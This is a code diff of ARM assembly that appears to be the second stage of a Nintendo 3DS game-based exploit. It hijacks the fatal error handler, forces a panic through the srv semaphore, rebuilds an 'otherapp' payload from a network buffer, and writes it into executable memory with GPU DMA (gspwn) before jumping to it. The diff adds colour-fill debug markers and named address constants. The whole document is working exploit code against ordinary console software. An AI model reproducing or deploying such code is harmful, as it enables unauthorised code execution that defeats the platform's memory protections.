@@ -1,4 +1,4 @@
-    #include "parameters.h"
+    #include "parameters.s"
     #include "addr.s"
     .arm
 	@ I'm about to commit sin with these branch abstractions
@@ -7,13 +7,16 @@
 	#define HELPERRELATIVEPTR(x) (HELPERAPP_TARGET_ADDR + ((x) - miniapp))
 	#define OTHERAPP_BINLOAD_SIZE 0xC000
 	#define MAKERESULT(level,summary,module,description) ((((level)&0x1F)<<27) | (((summary)&0x3F)<<21) | (((module)&0xFF)<<10) | ((description)&0x3FF))
+	#define COLORFILL(r,g,b) ( 0x1000000 | (b << 16) | (g << 8) | r)
 	@ some of the things here could be a lot cleaner
 	@ but hey, what can one expect of hand writen assembly sometimes
 _start:
 miniapp:
 	mov sp, r1
-    adr r6, .Lcourse_loader_stop_data
-    ldm r6!, {r4, r5}
+	mov r0, #1
+	bl colordebug
+    adr r6, .Lcourse_loader_stop_data @ Get to the course loader thread stop flag and set it
+    ldm r6!, {r4, r5} @  After execute, r6 == addr .Lsrv_notif_handle
     ldr r4, [r4, #0x10]
     add r4, r4, #0x1E0
     ldr r4, [r4, #0x58]
@@ -22,20 +25,28 @@ miniapp:
     ldr r4, [r4, #0x2A8]
     add r4, r4, #0x5800
     strb r5, [r4, #0xA5]
-	ldm r6!, {r1-r4}
+	ldm r6!, {r1-r4} @  After execute, r6 == addr .Lraise_thread_prio
 	ldr r1, [r1] @ get srv notification handle
-    str r4, [r3]
+    str r4, [r3] @ change the fatal handler to svc 0x9 (exit thread)
     mov r0, #0
 	svc 0x16 @ we release the srv semaphore get it out of waiting. It will panic due to the lack of a real srv notification
-    ldm r6!, {r0, r1}
+    ldm r6!, {r0, r1} @  After execute, r6 == addr .Lsleep_thread_param
+    svc 0x0C
+	ldm r6!, {r0, r1} @  After execute, r6 == addr .Ltarget_otherapp
     svc 0x0A
-    bl reconstruct_otherapp
+	mov r0, #2
+	bl colordebug
+    bl reconstruct_otherapp @ This function reconstructs the otherapp from all the copies in the recv buffer
 	ldm r6!, {r4, r5} @ hop over .Lnullptr with r1. After execute, r6 == addr .Lotherapp_stackaddr
 	sub sp, sp, r5, lsl #2
 	mov r2, r5
 	mov r1, r4
+	mov r0, #3
+	bl colordebug
 	mov r0, sp
 	bl find_vmem_pages
+	mov r0, #4
+	bl colordebug
 	mov r0, sp
 	mov r1, r5
 	bl copy_otherapp_from_save_to_text
@@ -53,23 +64,28 @@ miniapp:
 	str r8, [r6, #0x20]
 	str r9, [r6, #0x48]
 	str r10, [r6, #0x58]
+	mov r0, #0
+	bl colordebug
 	mov r0, r6
 	mov r1, r5
 	bx r4
 .Lcourse_loader_stop_data:
-    .word 0x5F7DC4
-    .word 0x75F1B26B
+    .word GAME_SEQUENCE_BASE_PTR
+    .word GAME_SEQUENCE_XOR_PAT
 .Lsrv_notif_handle:
-    .word 0x5E8F10
+    .word SRV_NOTIFICATION_HANDLE
     .word 1
-    .word 0x5E8EE4
+    .word FATAL_ERROR_HANDLER_ADDR
     .word HELPERRELATIVEPTR(fake_break_handler)
+.Lraise_thread_prio:
+	.word 0xFFFF8000 @ curr thread handle
+	.word 0x18
 .Lsleep_thread_param:
-    .word 200000000
+    .word 1000000000
     .word 0
 .Ltarget_otherapp:
-	.word 0x101000
-	.word 0xC
+	.word MINIAPP_OTHERAPP_TEXT_ADDR
+	.word (MINIAPP_MAXROPKIT_SIZE / 0x1000)
 .Lotherapp_stackaddr:
 	.word (0x10000000-4)
 .Lotherapp_data:
@@ -83,10 +99,13 @@ fake_break_handler:
 	svc 0x09
 
 CmpThrow:
+	push {lr}
 	movs r0, r0
-	bxpl lr
+	poppl {pc}
 Throw:
-	mov r1, lr
+	mov r0, #5
+	bl colordebug
+	pop {lr}
 	svc 0x3C
 
 @ search through paslr
@@ -186,9 +205,7 @@ copy_otherapp_from_save_to_text:
 	push {r0-r1, r4-r5, r7, lr}
 	pop {r4-r5}
 	adr r7, .Lotherapp_spaces
-	ldm r7, {r0-r2}
-	mov r7, r0
-	bl TEXTABSTRACTPTR(MEMCPY)
+	ldm r7, {r7}
 otherapp_gspwn_loop:
 	subs r5, r5, #1
 	popmi {r4-r5, r7, pc}
@@ -199,9 +216,7 @@ otherapp_gspwn_loop:
 	bl flush_and_gspwn
 	b otherapp_gspwn_loop
 .Lotherapp_spaces:
-	.word ROPKIT_LINEARMEM_BUF @ work space
 	.word MINIAPP_ROPKIT_DEST_ADDR @ save source
-	.word MINIAPP_MAXROPKIT_SIZE @ size
 
 @ except 32bit aligned and length all the way
 memcmp32:
@@ -265,11 +280,10 @@ ropkit_appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION
 @r1 = currptr
 @r2 = size
 @r3 = repeattimes
-@r4 = chunksize
+@r12 = chunksize
 reconstruct_findblock:
     push {r1-r12, lr}
     mov r10, #0
-    mov r12, r4
     findblockloop:
         ldr r4, [r1]
         cmp r4, #0
@@ -302,7 +316,6 @@ reconstruct_otherapp:
         mov r1, r5
         mov r2, r9
         mov r3, r10
-        mov r4, r12
         bl reconstruct_findblock
         bl CmpThrow
         add r11, r11, r12
@@ -318,4 +331,23 @@ reconstruct_otherapp:
     .word MINIAPP_ROPKIT_DEST_ADDR @ r11
     .word 0x37C @ r12
 
+@ R0 = color
+colordebug:
+	push {r0-r12, lr}
+	mov  r7, r0
+	adr  r6, .Lcolor_debug_data
+	ldm  r6!, {r0, r1, r3}
+	add  r2, r6, r7, LSL#2
+	bl	 TEXTABSTRACTPTR(GSP_WRITEHWREGS)
+	pop  {r0-r12, pc}
+.Lcolor_debug_data:
+	.word GSPGPU_SERVHANDLEADR
+	.word (0x10202A04 - 0x10000000)
+	.word 4
+	.word 0
+	.word COLORFILL(64, 64, 64)
+	.word COLORFILL(0, 255, 0)
+	.word COLORFILL(0, 0, 255)
+	.word COLORFILL(0, 255, 255)
+	.word COLORFILL(255, 0, 0)
 miniappend:
